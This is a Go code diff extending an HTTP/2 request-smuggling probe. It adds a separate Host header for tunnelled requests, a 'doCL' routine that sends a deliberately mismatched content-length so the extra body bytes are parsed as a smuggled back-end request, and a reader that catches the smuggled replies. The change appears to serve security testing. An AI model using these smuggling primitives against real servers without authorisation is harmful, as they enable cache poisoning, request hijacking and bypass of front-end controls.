@@ -51,6 +51,10 @@ type H2TunnelProbe struct {
 	// Host overrides the Host header used in the injected request lines.
 	// Defaults to target.HostHeader().
 	Host string
+	// TunnelHost overrides the Host header of the tunnelled requests only,
+	// which lets a gadget be served by a different virtual host. Defaults to
+	// Host.
+	TunnelHost string
 
 	// Attempts is how many poison+verify cycles to run. Default 2.
 	Attempts int
@@ -109,6 +113,10 @@ func (p *H2TunnelProbe) Execute(ctx context.Context, target Target, conn net.Con
 	if host == "" {
 		host = target.HostHeader()
 	}
+	tunnelHost := p.TunnelHost
+	if tunnelHost == "" {
+		tunnelHost = host
+	}
 	attempts := p.Attempts
 	if attempts <= 0 {
 		attempts = 2
@@ -124,7 +132,7 @@ func (p *H2TunnelProbe) Execute(ctx context.Context, target Target, conn net.Con
 		return e.finish(), err
 	}
 	idle := orDuration(p.Idle, 3*time.Second)
-	pathValue := buildTunnelPath(poisonPath, host, gadget, padding, newNonce())
+	pathValue := buildTunnelPath(poisonPath, host, tunnelHost, gadget, padding, newNonce())
 
 	tunnelConfirmed := false
 	for attempt := 1; attempt <= attempts; attempt++ {
@@ -198,7 +206,7 @@ func (p *H2TunnelProbe) Execute(ctx context.Context, target Target, conn net.Con
 // appends " HTTP/1.1" and its own headers to this value, so the first line
 // completes the outer HEAD request and the final dummy header absorbs the
 // appended version suffix.
-func buildTunnelPath(poisonPath, host, gadget string, padding []string, nonce string) string {
+func buildTunnelPath(poisonPath, host, tunnelHost, gadget string, padding []string, nonce string) string {
 	var b strings.Builder
 	b.WriteString(poisonPath)
 	b.WriteString(" HTTP/1.1\r\nHost: ")
@@ -212,7 +220,7 @@ func buildTunnelPath(poisonPath, host, gadget string, padding []string, nonce st
 		b.WriteString("GET ")
 		b.WriteString(path)
 		b.WriteString(" HTTP/1.1\r\nHost: ")
-		b.WriteString(host)
+		b.WriteString(tunnelHost)
 		b.WriteString("\r\n")
 		if i < len(requests)-1 {
 			b.WriteString("\r\n")
@@ -311,6 +319,69 @@ func (t *h2Tunnel) do(ctx context.Context, method, path string, idle time.Durati
 	return t.readStream(ctx, streamID, idle)
 }
 
+// doCL sends a request whose content-length header deliberately disagrees with
+// the DATA it carries. HEADERS has no END_STREAM; DATA carries the whole body
+// and ends the stream. A front-end that downgrades using the declared length
+// leaves the surplus DATA bytes on its back-end connection, where they are
+// parsed as the next HTTP/1.1 request. This is the H2.CL primitive.
+func (t *h2Tunnel) doCL(ctx context.Context, method, path, authority, scheme string, declared []int, body []byte, idle time.Duration) (*h2StreamResponse, error) {
+	streamID := t.nextID
+	t.nextID += 2
+
+	if len(declared) == 0 {
+		declared = []int{0}
+	}
+	var hb bytes.Buffer
+	henc := hpack.NewEncoder(&hb)
+	fields := []hpack.HeaderField{
+		{Name: ":method", Value: method},
+		{Name: ":scheme", Value: scheme},
+		{Name: ":authority", Value: authority},
+		{Name: ":path", Value: path},
+	}
+	for _, n := range declared {
+		fields = append(fields, hpack.HeaderField{Name: "content-length", Value: strconv.Itoa(n)})
+	}
+	fields = append(fields,
+		hpack.HeaderField{Name: "user-agent", Value: "omnislash-probe/1"},
+		hpack.HeaderField{Name: "accept", Value: "*/*"},
+		hpack.HeaderField{Name: "accept-encoding", Value: "identity"},
+	)
+	for _, f := range fields {
+		if err := henc.WriteField(f); err != nil {
+			return nil, fmt.Errorf("probe: h2 encode %s: %w", f.Name, err)
+		}
+	}
+
+	// HEADERS and DATA are deliberately separate writes. A front-end that
+	// downgrades as soon as it has the headers can flush the HTTP/1.1 request to
+	// its back-end before the surplus DATA arrives; that ordering is what leaves
+	// the extra bytes on the upstream socket.
+	var out bytes.Buffer
+	w := http2.NewFramer(&out, nil)
+	if err := w.WriteHeaders(http2.HeadersFrameParam{
+		StreamID:      streamID,
+		BlockFragment: hb.Bytes(),
+		EndHeaders:    true,
+		EndStream:     false,
+	}); err != nil {
+		return nil, fmt.Errorf("probe: h2 headers: %w", err)
+	}
+	if err := t.e.write(out.Bytes()); err != nil {
+		return nil, fmt.Errorf("probe: h2 headers write: %w", err)
+	}
+
+	out.Reset()
+	w = http2.NewFramer(&out, nil)
+	if err := w.WriteData(streamID, true, body); err != nil {
+		return nil, fmt.Errorf("probe: h2 data: %w", err)
+	}
+	if err := t.e.write(out.Bytes()); err != nil {
+		return nil, fmt.Errorf("probe: h2 data write: %w", err)
+	}
+	return t.readStream(ctx, streamID, idle)
+}
+
 func (t *h2Tunnel) hostValue() string {
 	if t.host != "" {
 		return t.host
@@ -379,6 +450,65 @@ func (t *h2Tunnel) readStream(ctx context.Context, streamID uint32, idle time.Du
 		case *http2.RSTStreamFrame:
 			if f.StreamID == streamID {
 				return resp, fmt.Errorf("probe: h2 stream %d reset: %v", streamID, f.ErrCode)
+			}
+		case *http2.GoAwayFrame:
+			return resp, fmt.Errorf("probe: h2 connection closed: %v", f.ErrCode)
+		}
+	}
+}
+
+// readAny is a diagnostic reader: it returns the next response frame set
+// regardless of stream id. It is used after a poison write to see whether a
+// front-end mapped the smuggled reply to a stream the probe did not request.
+func (t *h2Tunnel) readAny(ctx context.Context, idle time.Duration) (*h2StreamResponse, error) {
+	resp := &h2StreamResponse{}
+	for {
+		if err := ctx.Err(); err != nil {
+			return resp, err
+		}
+		deadline := time.Now().Add(idle)
+		if dl, ok := ctx.Deadline(); ok && dl.Before(deadline) {
+			deadline = dl
+		}
+		_ = t.e.conn.SetReadDeadline(deadline)
+		frame, err := t.fr.ReadFrame()
+		if err != nil {
+			return resp, err
+		}
+		switch f := frame.(type) {
+		case *http2.MetaHeadersFrame:
+			for _, field := range f.Fields {
+				resp.headers = append(resp.headers, Header{Key: field.Name, Value: field.Value})
+				if field.Name == ":status" {
+					resp.status, _ = strconv.Atoi(field.Value)
+				}
+			}
+			if f.StreamEnded() {
+				return resp, nil
+			}
+		case *http2.DataFrame:
+			if data := f.Data(); len(data) > 0 {
+				if int64(len(resp.body)+len(data)) <= t.maxBody {
+					resp.body = append(resp.body, data...)
+				}
+				if err := t.ackData(f.StreamID, len(data)); err != nil {
+					return resp, err
+				}
+			}
+			if f.StreamEnded() {
+				return resp, nil
+			}
+		case *http2.SettingsFrame:
+			if !f.IsAck() {
+				if err := t.control(func(w *http2.Framer) error { return w.WriteSettingsAck() }); err != nil {
+					return resp, err
+				}
+			}
+		case *http2.PingFrame:
+			if !f.IsAck() {
+				if err := t.control(func(w *http2.Framer) error { return w.WritePing(true, f.Data) }); err != nil {
+					return resp, err
+				}
 			}
 		case *http2.GoAwayFrame:
 			return resp, fmt.Errorf("probe: h2 connection closed: %v", f.ErrCode)
